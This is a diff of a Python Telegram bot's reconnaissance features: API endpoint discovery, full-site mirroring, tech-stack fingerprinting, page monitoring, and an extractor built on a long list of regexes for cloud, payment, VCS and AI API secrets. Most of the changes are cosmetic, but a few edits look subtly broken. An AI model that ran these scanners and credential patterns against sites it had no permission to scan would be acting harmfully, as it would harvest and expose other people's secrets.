         await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
 
 
-# ==================================================
-# 🔌  /api_discover   API ENDPOINT DISCOVERY COMMAND
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔌  /api_discover — API ENDPOINT DISCOVERY COMMAND
+# ══════════════════════════════════════════════════
 
 async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/api_discover <url> - Discover API endpoints, RSS feeds, hidden paths"""
+    """/api_discover <url> — Discover API endpoints, RSS feeds, hidden paths"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     if not context.user_data.get('_discover_internal'):
@@ -5357,8 +5439,8 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     domain = urlparse(url).netloc
     msg    = await update.effective_message.reply_text(
-        f"🔌 *API Discovery   `{domain}`*\n"
-        f"--------------------\n\n"
+        f"🔌 *API Discovery — `{domain}`*\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
         f"🔍 Phase 1: HTML source mining...\n"
         f"📦 Phase 2: JS bundle mining...\n"
         f"🤖 Phase 3: robots.txt scan...\n"
@@ -5400,7 +5482,7 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
     robots    = result.get("robots", [])
     stats     = result.get("stats", {})
 
-    # -- Summary message ---------------------------
+    # ── Summary message ───────────────────────────
     json_apis   = [e for e in endpoints if e["type"] in ("JSON_API", "GRAPHQL")]
     xml_feeds   = [e for e in endpoints if e["type"] == "XML/RSS"]
     api_docs    = [e for e in endpoints if e["type"] == "API_DOCS"]
@@ -5414,7 +5496,7 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not endpoints and not all_mined:
         await msg.edit_text(
-            f"🔌 *API Discovery   `{domain}`*\n\n"
+            f"🔌 *API Discovery — `{domain}`*\n\n"
             f"📭 API endpoints မတွေ့ပါ\n"
             f"_(protected or non-standard paths ဖြစ်နိုင်)_\n\n"
             f"🔍 Probed: `{stats.get('total_probed',0)}` paths",
@@ -5423,14 +5505,14 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     report_lines = [
-        f"🔌 *API Discovery   `{domain}`*",
-        "--------------------",
+        f"🔌 *API Discovery — `{domain}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"📊 Endpoints: `{len(endpoints)}` | 🔍 Probed: `{stats.get('total_probed',0)}`",
         f"📦 JS mined: `{stats.get('js_urls_found',0)}` | 🌐 HTML mined: `{stats.get('html_urls_found',0)}`",
         "",
     ]
 
-    # -- High Risk section first -------------------
+    # ── High Risk section first ───────────────────
     high_risk_eps = sorted(
         [e for e in endpoints if e.get("risk", 0) >= 30],
         key=lambda e: e.get("risk", 0), reverse=True
@@ -5470,7 +5552,7 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         report_lines.append(f"*📖 API Docs / Swagger ({len(api_docs)}):*")
         for e in api_docs[:5]:
             path = urlparse(e["url"]).path or e["url"]
-            note = f"   {e['note']}" if e.get('note') else ""
+            note = f" — {e['note']}" if e.get('note') else ""
             report_lines.append(f"  📘 `{path}`{note}")
         report_lines.append("")
 
@@ -5491,7 +5573,7 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         report_lines.append("")
 
     if protected:
-        report_lines.append(f"*🔒 Protected   Exists ({len(protected)}):*")
+        report_lines.append(f"*🔒 Protected — Exists ({len(protected)}):*")
         for e in protected[:10]:
             path = urlparse(e["url"]).path or e["url"]
             note = f" [{e.get('note',e['status'])}]"
@@ -5522,9 +5604,9 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
             report_lines.append(f"  🌐 `{path}` → `{e['cors']}`")
         report_lines.append("")
 
-    report_lines.append("⚠️ _Passive scan only   no exploitation_")
+    report_lines.append("⚠️ _Passive scan only — no exploitation_")
 
-    # -- Intel summary: env vars, routes, graphql schema ---------------------
+    # ── Intel summary: env vars, routes, graphql schema ─────────────────────
     env_vars  = _BUNDLE_INTEL.get('env_vars', {})
     js_routes = _BUNDLE_INTEL.get('js_routes', [])
 
@@ -5577,7 +5659,7 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     report_text = "\n".join(report_lines)
 
-    # -- Send text report --------------------------
+    # ── Send text report ──────────────────────────
     try:
         if len(report_text) <= 4000:
             await msg.edit_text(report_text, parse_mode='Markdown')
@@ -5589,7 +5671,7 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(
             report_text[:4000], parse_mode='Markdown')
 
-    # -- Export full JSON report + send as file ----
+    # ── Export full JSON report + send as file ────
     if endpoints or all_mined:
         try:
             safe_domain = re.sub(r'[^\w\-]', '_', domain)
@@ -5617,7 +5699,7 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 json.dump(export_data, jf, ensure_ascii=False, indent=2)
 
             cap = (
-                f"📦 *API Report   `{domain}`*\n"
+                f"📦 *API Report — `{domain}`*\n"
                 f"✅ `{len(endpoints)}` endpoints | 🕵️ `{len(all_mined)}` mined\n"
                 f"🗓 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
             )
@@ -5634,9 +5716,9 @@ async def cmd_api_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
             logger.warning("API JSON export error: %s", e)
 
 
-# ==================================================
-# 🔧 V30: HTML LINK REWRITER   offline browsing fix
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔧 V30: HTML LINK REWRITER — offline browsing fix
+# ══════════════════════════════════════════════════
 
 def _url_to_rel_local(asset_url: str, page_local: str, domain_dir: str) -> str:
     """Convert an absolute/relative asset URL to a relative local path."""
@@ -5661,19 +5743,19 @@ def rewrite_html_links(html: str, page_url: str, domain_dir: str) -> str:
         page_origin = f"{urlparse(page_url).scheme}://{urlparse(page_url).netloc}"
         soup        = BeautifulSoup(html, _BS_PARSER)
 
-        # -- <link href="..."> ---------------------
+        # ── <link href="..."> ─────────────────────
         for tag in soup.find_all('link', href=True):
             full = urljoin(page_url, tag['href'])
             if full.startswith(page_origin):
                 tag['href'] = _url_to_rel_local(full, page_local, domain_dir)
 
-        # -- <script src="..."> --------------------
+        # ── <script src="..."> ────────────────────
         for tag in soup.find_all('script', src=True):
             full = urljoin(page_url, tag['src'])
             if full.startswith(page_origin):
                 tag['src'] = _url_to_rel_local(full, page_local, domain_dir)
 
-        # -- <img src / data-src / srcset> ---------
+        # ── <img src / data-src / srcset> ─────────
         LAZY = ('src','data-src','data-lazy','data-original','data-lazy-src',
                 'data-full-src','data-image','data-img','data-bg',
                 'data-background','data-poster','data-thumb')
@@ -5697,7 +5779,7 @@ def rewrite_html_links(html: str, page_url: str, domain_dir: str) -> str:
                     parts.append(' '.join(bits))
                 tag['srcset'] = ', '.join(parts)
 
-        # -- <picture><source srcset="..."> WebP ---
+        # ── <picture><source srcset="..."> WebP ───
         for tag in soup.find_all('source'):
             srcset = tag.get('srcset', '')
             if srcset:
@@ -5715,7 +5797,7 @@ def rewrite_html_links(html: str, page_url: str, domain_dir: str) -> str:
                 if full.startswith(page_origin):
                     tag['src'] = _url_to_rel_local(full, page_local, domain_dir)
 
-        # -- <video/audio src> ---------------------
+        # ── <video/audio src> ─────────────────────
         for tag in soup.find_all(['video', 'audio']):
             if tag.get('src'):
                 full = urljoin(page_url, tag['src'])
@@ -5726,9 +5808,7 @@ def rewrite_html_links(html: str, page_url: str, domain_dir: str) -> str:
                 if full.startswith(page_origin):
                     tag['poster'] = _url_to_rel_local(full, page_local, domain_dir)
 
-        # -- <a href="..."> internal links ---------
-        # v46: Extract links from various tags
-         # v46: Extract links from various tags
+        # ── <a href="..."> internal links ─────────
         for tag in soup.find_all(['a', 'link', 'script', 'img'], href=True) + soup.find_all('img', src=True) + soup.find_all('script', src=True):
             href = tag.get('href') or tag.get('src')
             if not href or href.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
@@ -5739,22 +5819,23 @@ def rewrite_html_links(html: str, page_url: str, domain_dir: str) -> str:
             else:
                 if full.startswith('http') and full not in external:
                     external.append(full)
+                full = urljoin(page_url, tag['action'])
             if full.startswith(page_origin):
                 tag['action'] = _url_to_rel_local(full, page_local, domain_dir)
 
-        # -- inline style url(...) -----------------
+        # ── inline style url(...) ─────────────────
         for tag in soup.find_all(style=True):
             new_style = _rewrite_css_urls(tag['style'], page_url, page_local, domain_dir, page_origin)
             tag['style'] = new_style
 
-        # -- <style> block -------------------------
+        # ── <style> block ─────────────────────────
         for tag in soup.find_all('style'):
             if tag.string:
                 tag.string.replace_with(
                     _rewrite_css_urls(tag.string, page_url, page_local, domain_dir, page_origin)
                 )
 
-        # -- <svg><image href="..."> ---------------
+        # ── <svg><image href="..."> ───────────────
         for tag in soup.find_all('image'):
             for attr in ('href', 'xlink:href'):
                 v = tag.get(attr, '')
@@ -5763,7 +5844,7 @@ def rewrite_html_links(html: str, page_url: str, domain_dir: str) -> str:
                     if full.startswith(page_origin):
                         tag[attr] = _url_to_rel_local(full, page_local, domain_dir)
 
-        # -- <use xlink:href> (SVG sprites) --------
+        # ── <use xlink:href> (SVG sprites) ────────
         for tag in soup.find_all('use'):
             for attr in ('href', 'xlink:href'):
                 v = tag.get(attr, '')
@@ -5789,7 +5870,7 @@ def _rewrite_css_urls(css: str, page_url: str, page_local: str, domain_dir: str,
         if full.startswith(origin):
             return f"url('{_url_to_rel_local(full, page_local, domain_dir)}')"
         return m.group(0)
-    return re.sub(r'''url\(\s*(["']?[^)"'\s]+["']?)\s*\)''', _replacer, css)
+    return re.sub(r'''url\(\s*(["\x27"]?[^)"'\s]+["\x27"]?)\s*\)''', _replacer, css)
 
 
 def download_website(
@@ -5826,7 +5907,7 @@ def download_website(
     safe       = re.sub(r'[^\w\-]', '_', domain)
     domain_dir = os.path.join(DOWNLOAD_DIR, safe)  # type: ignore[name-defined]
 
-    # -- Resume or fresh start ----------------------------------------
+    # ── Resume or fresh start ────────────────────────────────────────
     if resume and os.path.exists(domain_dir):
         # Keep existing files; load state
         state = load_resume(base_url)  # type: ignore[name-defined]
@@ -5836,11 +5917,11 @@ def download_website(
         state = {"visited": [], "downloaded": [], "assets": [], "stats": {}}
     os.makedirs(domain_dir, exist_ok=True)
 
-    # -- Sub-folder structure -----------------------------------------
+    # ── Sub-folder structure ─────────────────────────────────────────
     for sub in ('pages', 'assets', 'css', 'js', 'fonts', 'media'):
         os.makedirs(os.path.join(domain_dir, sub), exist_ok=True)
 
-    # -- Site profile -------------------------------------------------
+    # ── Site profile ─────────────────────────────────────────────────
     if not hasattr(site_profile, 'asset_workers'):
         # BUG FIX v39: detect_site_profile မပြီးမချင်း progress_cb မခေါ်တဲ့ ပြသနာ fix
         # → user မြင်တာ: 0% stuck ဖြစ်နေတယ်ထင် (spinner frozen)
@@ -5857,7 +5938,7 @@ def download_website(
             f"{site_profile.summary()}"
         )
 
-    # -- State init ---------------------------------------------------
+    # ── State init ───────────────────────────────────────────────────
     visited      = set(state.get("visited", []))
     dl_done      = set(state.get("downloaded", []))   # normalized URLs
     known_assets = set(state.get("assets", []))
@@ -5870,7 +5951,7 @@ def download_website(
         """Strip trailing slash and fragment for dedup."""
         return u.rstrip('/').split('#')[0]
 
-    # -- Session ------------------------------------------------------
+    # ── Session ──────────────────────────────────────────────────────
     session = _get_pooled_session(verify_ssl=False)  # type: ignore[name-defined]
     session.headers.update(_get_headers())           # type: ignore[name-defined]
 
@@ -5887,7 +5968,7 @@ def download_website(
                 k, v = hdr.split(':', 1)
                 session.headers[k.strip()] = v.strip()
 
-    # -- Constants ----------------------------------------------------
+    # ── Constants ────────────────────────────────────────────────────
     TIMEOUT_VAL       = int(os.getenv("TIMEOUT", "45"))   # type: ignore[name-defined]
     max_bytes         = int(os.getenv("APP_MAX_MB", "150")) * 1024 * 1024  # type: ignore[name-defined]
     MAX_SINGLE_BYTES  = 50 * 1024 * 1024   # 50 MB per asset hard cap
@@ -5899,7 +5980,7 @@ def download_website(
         '.iso', '.exe', '.dmg', '.pkg', '.bin',
     })
 
-    # -- Phase 0: Sitemap ---------------------------------------------
+    # ── Phase 0: Sitemap ─────────────────────────────────────────────
     queue: deque = deque([base_url])
     _depth_map: dict = {base_url: 0}
 
@@ -5920,7 +6001,7 @@ def download_website(
         except Exception as e:
             logger.warning("Sitemap fetch error: %s", e)
 
-    # -- Phase 1: Pages (Multi-threaded) ------------------------------
+    # ── Phase 1: Pages (Multi-threaded) ──────────────────────────────
     seen_q: set = set(queue)
     PAGE_WORKERS = max(1, min(ASSET_WORKERS, 4))  # Pages are heavier, use fewer workers
     
@@ -5997,7 +6078,7 @@ def download_website(
             if stats['pages'] % 10 == 0:
                 save_resume(base_url, {"visited": list(visited), "downloaded": list(dl_done), "assets": list(known_assets), "stats": stats})
 
-    # -- Phase 2: Assets   parallel download -------------------------
+    # ── Phase 2: Assets — parallel download ─────────────────────────
     # Normalize dl_done for proper dedup check
     dl_done_norm  = {_normalize(u) for u in dl_done}
     # Limit asset_list to max_assets minus already downloaded assets
@@ -6076,7 +6157,7 @@ def download_website(
         except NameError:
             safe_ok = True
         if not safe_ok:
-            logger.warning("Asset SSRF blocked: %s   %s", asset_url, reason)
+            logger.warning("Asset SSRF blocked: %s — %s", asset_url, reason)
             return set(), set(), 0, False
 
         # Resume check: if file already downloaded and non-empty, skip
@@ -6098,14 +6179,14 @@ def download_website(
                     stream=True,
                 )
 
-                # -- 429 Rate-limit --------------------------------
+                # ── 429 Rate-limit ────────────────────────────────
                 if resp.status_code == 429:
                     raw_ra = resp.headers.get('Retry-After', str(2 ** (attempt + 2)))
                     try:
                         retry_after = min(int(raw_ra), 60)   # hard cap 60s
                     except ValueError:
                         retry_after = 10
-                    logger.warning("429 on %s   pause %ds (attempt %d)",
+                    logger.warning("429 on %s — pause %ds (attempt %d)",
                                    asset_url[:60], retry_after, attempt + 1)
                     
                     # v45: Global back-off for all threads
@@ -6118,7 +6199,7 @@ def download_website(
                         _rate_event.wait(timeout=retry_after + 5)
                     continue
 
-                # -- 5xx server errors -----------------------------
+                # ── 5xx server errors ─────────────────────────────
                 if resp.status_code in (500, 502, 503, 504, 520, 522, 524):
                     if attempt < MAX_ASSET_RETRIES - 1:
                         time.sleep(2 ** attempt + random.uniform(0.3, 0.8))
@@ -6128,20 +6209,20 @@ def download_website(
                 if resp.status_code >= 400:
                     return set(), set(), 0, False
 
-                # -- Content-Length pre-check ----------------------
+                # ── Content-Length pre-check ──────────────────────
                 cl_header = resp.headers.get('Content-Length')
                 if cl_header:
                     try:
                         cl = int(cl_header)
                         if cl > MAX_SINGLE_BYTES:
-                            logger.warning("Asset too large (%dMB): %s   skipped",
+                            logger.warning("Asset too large (%dMB): %s — skipped",
                                            cl // 1024 // 1024, asset_url[:60])
                             resp.close()
                             return set(), set(), 0, False
                     except ValueError:
                         pass
 
-                # -- Stream download -------------------------------
+                # ── Stream download ───────────────────────────────
                 buf = io.BytesIO()
                 downloaded = 0
                 for chunk in resp.iter_content(CHUNK_SIZE):
@@ -6158,7 +6239,7 @@ def download_website(
                 if not content:
                     return set(), set(), 0, False
 
-                # -- Save to appropriate sub-folder ----------------
+                # ── Save to appropriate sub-folder ────────────────
                 try:
                     local = safe_local_path(domain_dir, asset_url)  # type: ignore[name-defined]
                     os.makedirs(os.path.dirname(local), exist_ok=True)
@@ -6192,20 +6273,20 @@ def download_website(
                 return css_hits, js_hits, size_kb, True
 
             except Exception as e:
-                err_name = type(e).__name__
-                logger.warning("Asset download failed [%s] %s: %s",
-                               attempt, asset_url[:60], e)
-                if 'Timeout' in err_name or 'Connection' in err_name:
-                    if attempt < MAX_ASSET_RETRIES - 1:
-                        time.sleep(1.5 * (attempt + 1) + random.uniform(0.1, 0.5))
-                        continue
-                return set(), set(), 0, False
-
-                return set(), set(), 0, False
+                    err_name = type(e).__name__
+                    # v46: More robust error logging for asset download failures
+                    logger.warning("Asset download failed [%s] %s: %s",
+                                   attempt, asset_url[:60], e)
+                    if 'Timeout' in err_name or 'Connection' in err_name:
+                        if attempt < MAX_ASSET_RETRIES - 1:
+                            time.sleep(1.5 * (attempt + 1) + random.uniform(0.1, 0.5)) # Add jitter
+                            continue
+                    # For other unexpected errors, log and fail immediately
+                    return set(), set(), 0, False
 
         return set(), set(), 0, False
 
-    # -- Run parallel asset downloads (Recursive) --------------------
+    # ── Run parallel asset downloads (Recursive) ────────────────────
     completed = 0
     with concurrent.futures.ThreadPoolExecutor(max_workers=ASSET_WORKERS) as ex:
         # v45: Use a while loop to handle recursive asset discovery
@@ -6282,7 +6363,7 @@ def download_website(
                     except Exception:
                         pass
 
-    # -- Phase 3: CSS nested assets (recursive @import, max depth 3) -
+    # ── Phase 3: CSS nested assets (recursive @import, max depth 3) ─
     def _dl_css_extra(asset_url: str):
         """
         Download a CSS file discovered via @import chain.
@@ -6351,7 +6432,7 @@ def download_website(
                     stats['failed'] += 1
         css_queue = [u for u in next_level if _normalize(u) not in dl_done_norm][:100]
 
-    # -- Phase 4: ZIP ------------------------------------------------
+    # ── Phase 4: ZIP ────────────────────────────────────────────────
     if progress_cb:
         progress_cb("🗜️ ZIP ထုပ်နေပါတယ်...")
 
@@ -6380,7 +6461,7 @@ def download_website(
     return [zip_path], None, stats, size_mb
 
 async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/tech <url> - Detect technology stack"""
+    """/tech <url> — Detect technology stack"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/tech https://example.com`\n\n"
@@ -6399,7 +6480,7 @@ async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\\n"
             f"သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     _active_scans.set(uid, "TechStack")
@@ -6416,7 +6497,7 @@ async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = await update.effective_message.reply_text("🔬 Tech stack fingerprinting...")
 
     def _do_tech_scan():
-        # -- Reuse cached SiteProfile if available (no double request) --
+        # ── Reuse cached SiteProfile if available (no double request) ──
         domain_key = urlparse(url).netloc
         profile    = _PROFILE_CACHE.get(domain_key)
 
@@ -6434,7 +6515,7 @@ async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     detected[tech] = p
                     break
 
-        # -- Augment with SiteProfile hints (free   no extra request) --
+        # ── Augment with SiteProfile hints (free — no extra request) ──
         if profile:
             if profile.is_cloudflare and "Cloudflare" not in detected:
                 detected["Cloudflare"] = "(profile)"
@@ -6447,7 +6528,7 @@ async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     if hint not in detected:
                         detected[hint] = "(profile)"
 
-        # -- Cache this profile now if not yet cached --
+        # ── Cache this profile now if not yet cached ──
         if not profile:
             p2 = SiteProfile()
             if 'cloudflare' in combined: p2.is_cloudflare = True
@@ -6470,7 +6551,7 @@ async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     domain = urlparse(url).hostname
     profile_badge = f" | {profile.profile_name}" if profile else ""
-    lines  = [f"🔬 *Tech Stack   `{domain}`*", f"Status: `{status}`{profile_badge}\n"]
+    lines  = [f"🔬 *Tech Stack — `{domain}`*", f"Status: `{status}`{profile_badge}\n"]
 
     # Group by category
     _CAT = {
@@ -6516,15 +6597,15 @@ async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
     _active_scans.pop(uid, None)   # fix: release scan slot
 
 
-# ==================================================
-# 🔔  FEATURE 3   /monitor  Change Detection & Alerting
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔔  FEATURE 3 — /monitor  Change Detection & Alerting
+# ══════════════════════════════════════════════════
 # DB structure: db["monitors"][str(uid)] = [{"url":..,"interval_min":..,"last_hash":..,"last_check":..,"label":..}]
 
 _monitor_app_ref = None   # set in main() to access app.bot
 
 async def monitor_loop():
-    """Background task - check monitored URLs for content changes every 60s."""
+    """Background task — check monitored URLs for content changes every 60s."""
     global _monitor_app_ref
     while True:
         try:
@@ -6567,7 +6648,7 @@ async def monitor_loop():
                             chat_id=int(uid_str),
                             text=(
                                 f"🔔 *Page Changed!*\n"
-                                f"--------------------\n"
+                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                 f"🏷 *{label}*\n"
                                 f"🔗 `{entry['url'][:60]}`\n"
                                 f"📡 Status: `{status}`\n"
@@ -6594,13 +6675,13 @@ async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not sub or sub == "help":
         await update.effective_message.reply_text(
-            "🔔 *Page Monitor   Usage*\n\n"
+            "🔔 *Page Monitor — Usage*\n\n"
             "`/monitor add <url> [interval] [label]`\n"
             "  └ interval = minutes (default 30, min 5)\n"
             "  └ label = custom name (optional)\n\n"
-            "`/monitor list`   View all monitors\n"
-            "`/monitor del <n>`   Remove by number\n"
-            "`/monitor clear`   Remove all\n\n"
+            "`/monitor list` — View all monitors\n"
+            "`/monitor del <n>` — Remove by number\n"
+            "`/monitor clear` — Remove all\n\n"
             "📣 Bot ကို alert ပို့ပေးမယ် page ပြောင်းတိုင်း",
             parse_mode='Markdown'
         )
@@ -6681,31 +6762,31 @@ async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.effective_message.reply_text("❓ Unknown subcommand. Use `/monitor help`", parse_mode='Markdown')
 
 
-# ==================================================
-# 🔑  FEATURE 7   /extract  Secret & Sensitive Data Extractor
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔑  FEATURE 7 — /extract  Secret & Sensitive Data Extractor
+# ══════════════════════════════════════════════════
 
 _SECRET_PATTERNS = {
-    # -- Cloud / AWS --------------------------------
+    # ── Cloud / AWS ────────────────────────────────
     "AWS Access Key":         (r'AKIA[0-9A-Z]{16}',                                    "🔴"),
     "AWS Secret Key":         (r'(?i)aws.{0,20}secret.{0,20}[0-9a-zA-Z/+]{40}',       "🔴"),
     "AWS Session Token":      (r'FwoGZXIvYXdzE[a-zA-Z0-9/+]{100,}',                   "🔴"),
     "AWS Account ID":         (r'(?<!\d)\d{12}(?!\d)',                                  "🟡"),
-    # -- Cloud / GCP / Azure -----------------------
+    # ── Cloud / GCP / Azure ───────────────────────
     "GCP Service Account":    (r'"type"\s*:\s*"service_account"',                       "🔴"),
     "GCP API Key":            (r'(?i)gcp.{0,20}key.{0,10}[A-Za-z0-9_\-]{30,}',        "🔴"),
     "DigitalOcean Token":     (r'dop_v1_[a-f0-9]{64}',                                 "🔴"),
     "DigitalOcean Key":       (r'do_key_[a-f0-9]{40,}',                                "🔴"),
     "Cloudflare API Key":     (r'(?i)cloudflare.{0,20}[0-9a-f]{37}',                   "🔴"),
-    "Cloudflare Global Key":  (r'(?i)x-auth-key["\s:=]+["\x27][0-9a-f]{37}["\x27]',       "🔴"),
+    "Cloudflare Global Key":  (r'(?i)x-auth-key["\s:=]+["\x27"][0-9a-f]{37}["\x27"]',       "🔴"),
     "Azure ConnStr":          (r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+', "🔴"),
-    "Azure SAS Token":        (r'sv=\d{4}-\d{2}-\d{2}&s[a-z]=.{10,}sig=[^&\s"\x27]{10,}', "🔴"),
+    "Azure SAS Token":        (r'sv=\d{4}-\d{2}-\d{2}&s[a-z]=.{10,}sig=[^&\\s"\x27]{10,}', "🔴"),
     "Heroku API Key":         (r'(?i)heroku.{0,20}[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "🔴"),
     "Netlify Token":          (r'(?i)netlify.{0,20}[0-9a-zA-Z_\-]{40,}',              "🔴"),
     "Vercel Token":           (r'(?i)vercel.{0,20}[0-9a-zA-Z_\-]{24,}',               "🟠"),
     "Render Token":           (r'rnd_[A-Za-z0-9]{32,}',                                "🟠"),
     "Railway Token":          (r'(?i)railway.{0,20}[0-9a-zA-Z_\-]{40,}',              "🟠"),
-    # -- Payment -----------------------------------
+    # ── Payment ───────────────────────────────────
     "Stripe Secret":          (r'sk_live_[0-9a-zA-Z]{24,}',                            "🔴"),
     "Stripe Restricted":      (r'rk_live_[0-9a-zA-Z]{24,}',                            "🔴"),
     "Stripe Public":          (r'pk_live_[0-9a-zA-Z]{24,}',                            "🟡"),
@@ -6715,22 +6796,22 @@ _SECRET_PATTERNS = {
     "Braintree Token":        (r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}', "🔴"),
     "Adyen API Key":          (r'AQE[a-zA-Z0-9]{62,}',                                 "🔴"),
     "Razorpay Key":           (r'rzp_live_[a-zA-Z0-9]{14}',                            "🔴"),
-    # -- Auth / Identity ---------------------------
+    # ── Auth / Identity ───────────────────────────
     "JWT Token":              (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', "🔴"),
     "Private Key Block":      (r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----', "🔴"),
     "Certificate":            (r'-----BEGIN CERTIFICATE-----',                          "🟡"),
     "Bearer Token":           (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',                  "🟠"),
     "Basic Auth Header":      (r'(?i)authorization:\s*basic\s+[A-Za-z0-9+/=]{8,}',     "🟠"),
-    "OAuth Client Secret":    (r'(?i)client[_-]?secret["\s:=]+["\x27][a-zA-Z0-9_\-]{20,}["\x27]', "🔴"),
-    "Auth Token Generic":     (r'(?i)auth[_-]?token["\s:=]+["\x27][a-zA-Z0-9_\-]{20,}["\x27]', "🟠"),
-    # -- Google / Firebase -------------------------
+    "OAuth Client Secret":    (r'(?i)client[_-]?secret["\s:=]+["\x27"][a-zA-Z0-9_\-]{20,}["\x27"]', "🔴"),
+    "Auth Token Generic":     (r'(?i)auth[_-]?token["\s:=]+["\x27"][a-zA-Z0-9_\-]{20,}["\x27"]', "🟠"),
+    # ── Google / Firebase ─────────────────────────
     "Google API Key":         (r'AIza[0-9A-Za-z_-]{35}',                               "🔴"),
     "Firebase Config":        (r'"apiKey"\s*:\s*"AIza[0-9A-Za-z_-]{35}"',              "🔴"),
     "Firebase DB URL":        (r'https://[a-z0-9-]+\.firebaseio\.com',                  "🟡"),
     "Firebase Storage":       (r'https://[a-z0-9-]+\.appspot\.com',                    "🟡"),
     "Google OAuth":           (r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com', "🔴"),
     "Google Cloud Key":       (r'AIza[0-9A-Za-z\-_]{35}',                              "🔴"),
-    # -- VCS / CI-CD -------------------------------
+    # ── VCS / CI-CD ───────────────────────────────
     "GitHub Token":           (r'ghp_[0-9a-zA-Z]{36}',                                 "🔴"),
     "GitHub Fine-grained":    (r'github_pat_[0-9a-zA-Z_]{82}',                         "🔴"),
     "GitHub OAuth":           (r'gho_[0-9a-zA-Z]{36}',                                 "🔴"),
@@ -6741,7 +6822,7 @@ _SECRET_PATTERNS = {
     "CircleCI Token":         (r'(?i)circle.{0,20}[0-9a-f]{40}',                       "🔴"),
     "Travis CI Token":        (r'(?i)travis.{0,20}[0-9a-zA-Z_\-]{20,}',               "🟠"),
     "Jenkins Token":          (r'(?i)jenkins.{0,20}[0-9a-f]{32,}',                     "🔴"),
-    # -- Messaging / Email -------------------------
+    # ── Messaging / Email ─────────────────────────
     "Slack Token":            (r'xox[baprs]-[0-9a-zA-Z\-]+',                           "🔴"),
     "Slack Webhook":          (r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+', "🔴"),
     "Discord Webhook":        (r'https://discord(?:app)?\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+', "🟠"),
@@ -6753,36 +6834,36 @@ _SECRET_PATTERNS = {
     "Twilio Key":             (r'SK[0-9a-fA-F]{32}',                                   "🟠"),
     "Twilio AccountSID":      (r'AC[a-z0-9]{32}',                                      "🟡"),
     "Twilio Auth Token":      (r'(?i)twilio.{0,20}auth.{0,10}[0-9a-f]{32}',            "🔴"),
-    "Vonage / Nexmo":         (r'(?i)nexmo.{0,20}api_secret["\s:=]+["\x27][a-zA-Z0-9]{16}["\x27]', "🔴"),
-    # -- AI / ML -----------------------------------
+    "Vonage / Nexmo":         (r'(?i)nexmo.{0,20}api_secret["\s:=]+["\x27"][a-zA-Z0-9]{16}["\x27"]', "🔴"),
+    # ── AI / ML ───────────────────────────────────
     "OpenAI Key":             (r'sk-[a-zA-Z0-9]{48}',                                  "🔴"),
     "OpenAI Project Key":     (r'sk-proj-[a-zA-Z0-9\-_]{80,}',                        "🔴"),
     "Anthropic Key":          (r'sk-ant-[a-zA-Z0-9\-_]{90,}',                          "🔴"),
     "HuggingFace Token":      (r'hf_[a-zA-Z]{34}',                                     "🟡"),
     "Cohere API Key":         (r'(?i)cohere.{0,20}[a-zA-Z0-9_\-]{40}',                "🟠"),
     "Replicate Token":        (r'r8_[a-zA-Z0-9]{40}',                                  "🟠"),
-    # -- Database ----------------------------------
